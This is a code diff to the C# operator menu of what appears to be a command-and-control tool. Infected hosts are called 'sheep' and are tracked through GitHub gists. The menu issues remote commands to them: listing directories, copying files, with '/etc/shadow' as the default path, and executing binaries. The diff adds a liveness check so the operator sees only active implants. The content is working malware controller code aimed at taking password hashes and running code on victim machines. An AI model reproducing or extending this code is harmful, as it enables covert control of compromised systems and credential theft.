@@ -24,7 +24,14 @@ public class Wizard
                 await DisplaySheep();
                 break;
             case MainMenuOptions.ControlSheep:
-                var key = await SelectSheep();
+                var key = await SelectAliveSheep();
+
+                if (string.IsNullOrEmpty(key))
+                {
+                    Console.WriteLine("No active sheep to control :(\n");
+                    break;
+                }
+
                 await SheepAction(key);
                 break;
             case MainMenuOptions.EuthanizeSheep:
@@ -51,18 +58,18 @@ public class Wizard
                 await _shepherdController.CommandW(sheepKey);
                 break;
             case SheepActionsOptions.Ls:
-                var lsPath = Prompt.Input<string>("Path 🛣️", placeholder:"/home/Billy/pasture");
-                await _shepherdController.CommandLs(sheepKey,lsPath);
+                var lsPath = Prompt.Input<string>("Path 🛣️", placeholder: "/home/Billy/pasture");
+                await _shepherdController.CommandLs(sheepKey, lsPath);
                 break;
             case SheepActionsOptions.Id:
                 await _shepherdController.CommandId(sheepKey);
                 break;
             case SheepActionsOptions.Copy:
-                var copyPath = Prompt.Input<string>("Path 🛣️", placeholder:"/etc/shadow");
+                var copyPath = Prompt.Input<string>("Path 🛣️", placeholder: "/etc/shadow");
                 await _shepherdController.CommandCopy(sheepKey, copyPath);
                 break;
             case SheepActionsOptions.Execute:
-                var executePath = Prompt.Input<string>("Path 🛣️", placeholder:"/usr/bin/feed");
+                var executePath = Prompt.Input<string>("Path 🛣️", placeholder: "/usr/bin/feed");
                 await _shepherdController.CommandExecute(sheepKey, executePath);
                 break;
             case SheepActionsOptions.Return:
@@ -72,12 +79,20 @@ public class Wizard
         }
     }
 
-    private async Task<string> SelectSheep()
+    private async Task<string> SelectAliveSheep()
     {
-        var sheep = await _shepherdController.GetSheep();
+        var sheep = await _shepherdController.GetSheepGists();
+        var sheepAlive = await _shepherdController.GetSheepAlive();
+        
         var sheepSelectOptions = sheep
+            .Where(s => sheepAlive[s.Key])
             .Select(s => s.Key)
             .ToArray();
+
+        if (sheepSelectOptions.Length < 1)
+        {
+            return "";
+        }
 
         var selectedSheepKey = Prompt.Select<string>(x =>
             x
@@ -90,16 +105,17 @@ public class Wizard
 
     private async Task DisplaySheep()
     {
-        var sheep = await _shepherdController.GetSheep();
+        var sheep = await _shepherdController.GetSheepGists();
+        var sheepAlive = await _shepherdController.GetSheepAlive();
 
         Console.WriteLine("Listing active sheep... 🐏");
 
 
-        ConsoleTable table = new ConsoleTable("Sheep Id 🐑", "Gist Id 🗒️");
+        ConsoleTable table = new ConsoleTable("Sheep Id 🐑", "Gist Id 🗒️", "Status ️");
 
         foreach (var s in sheep)
         {
-            table.AddRow(s.Key, $"https://gist.github.com/{s.Value}");
+            table.AddRow(s.Key, $"https://gist.github.com/{s.Value}", sheepAlive[s.Key] ? "Alive" : "Dead");
         }
 
         table.Write();
